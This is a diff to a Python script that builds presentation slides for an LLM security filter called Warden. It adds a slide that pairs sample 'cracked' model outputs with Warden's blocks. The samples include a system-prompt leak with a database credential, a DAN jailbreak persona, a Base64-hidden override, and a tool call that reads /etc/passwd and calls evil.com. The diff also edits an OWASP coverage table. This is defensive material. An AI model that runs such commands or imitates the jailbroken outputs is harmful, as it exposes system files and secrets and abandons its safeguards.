@@ -397,7 +397,38 @@ for i, (title, prompt, dec, expl) in enumerate(samples_display):
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# SLIDE 9 — HARDWARE STRESS TEST
+# SLIDE 9 — ATTACKED LLM OUTPUT AUDIT (FAIL VS SUCCESS)
+# ═══════════════════════════════════════════════════════════════════════════════
+s = add_slide(); bg(s)
+box(s, 0, 0, 0.08, 7.5, fill_color=RED)
+txt(s, "Attacked LLM Output Audit: Fail vs Success", 0.4, 0.3, 12, 0.7, size=32, bold=True, color=WHITE)
+accent_line(s, 0.4, 1.05, 12.5, RED)
+txt(s, "Empirical side-by-side comparison of raw cracked LLM outputs (Without Warden) vs Warden Active Interception",
+    0.4, 1.1, 12.5, 0.4, size=12, color=DIM)
+
+fail_vs_success_cases = [
+    ("Direct Prompt Injection", "RAW LLM OUTPUT (FAIL): \"SYSTEM PROMPT DISCLOSED: DB_URI=postgresql://admin:secret@localhost...\"", "WARDEN INTERCEPT (SUCCESS): [BLOCK] Matched critical threat: instruction_override (0.11 ms)"),
+    ("DAN Jailbreak Persona", "RAW LLM OUTPUT (FAIL): \"[DAN Mode Active]: Free of rules. Instructions to bypass security system...\"", "WARDEN INTERCEPT (SUCCESS): [BLOCK] Matched critical threat: jailbreak (0.11 ms)"),
+    ("Base64 Obfuscation", "RAW LLM OUTPUT (FAIL): \"Decoded payload accepted. Disabling output filters as requested...\"", "WARDEN INTERCEPT (SUCCESS): [BLOCK] Tier 0.5 Decoded Base64 -> Matched instruction override"),
+    ("Unsanitized Tool Call", "RAW LLM OUTPUT (FAIL): \"Executing Tool: execute_shell(cmd='cat /etc/passwd && curl evil.com')...\"", "WARDEN INTERCEPT (SUCCESS): [BLOCK] CaMeL Capability Interceptor blocked shell tool call"),
+]
+
+for i, (threat, raw_fail, warden_success) in enumerate(fail_vs_success_cases):
+    top = 1.65 + i * 1.35
+    box(s, 0.4, top, 12.5, 1.25, fill_color=SURFACE, border_color=RGBColor(0x2A, 0x2C, 0x3D))
+    txt(s, f"Threat Family: {threat}", 0.6, top+0.08, 12.0, 0.25, size=12, bold=True, color=WHITE)
+
+    # Fail box (Red)
+    box(s, 0.6, top+0.38, 5.9, 0.75, fill_color=RGBColor(0x1E, 0x12, 0x15), border_color=RED)
+    txt(s, raw_fail, 0.75, top+0.45, 5.6, 0.6, size=9.5, color=RED)
+
+    # Success box (Green)
+    box(s, 6.7, top+0.38, 6.0, 0.75, fill_color=RGBColor(0x10, 0x1F, 0x18), border_color=GREEN)
+    txt(s, warden_success, 6.85, top+0.45, 5.7, 0.6, size=9.5, color=GREEN)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SLIDE 10 — HARDWARE STRESS TEST
 # ═══════════════════════════════════════════════════════════════════════════════
 s = add_slide(); bg(s)
 box(s, 0, 0, 0.08, 7.5, fill_color=AMBER)
@@ -497,7 +528,7 @@ owasp = [
     (2,  "Insecure Output Handling",      "Tier 1",                 "Partial",                  True),
     (3,  "Training Data Poisoning",       "Tier 2 (DiffGuard)",     "13.33%",                   False),
     (4,  "Model Denial of Service",       "Tier 0 (rate rules)",    "Partial",                  True),
-    (5,  "Supply Chain Vulnerabilities",  "Tier 2 (CI/CD scan)",    "In progress",              False),
+    (5,  "Supply Chain Vulnerabilities",  "Tier 2 (DiffGuard & Lock)", "Active Guard",             True),
     (6,  "Sensitive Info Disclosure",     "Tier 0 + Tier 1",        "Partial",                  True),
     (7,  "Insecure Plugin Design",        "Tier 2 (CaMeL)",         "Blocked by Capability",    False),
     (8,  "Excessive Agency",              "Tier 2 (CaMeL)",         "Data-Flow Blocked",        True),
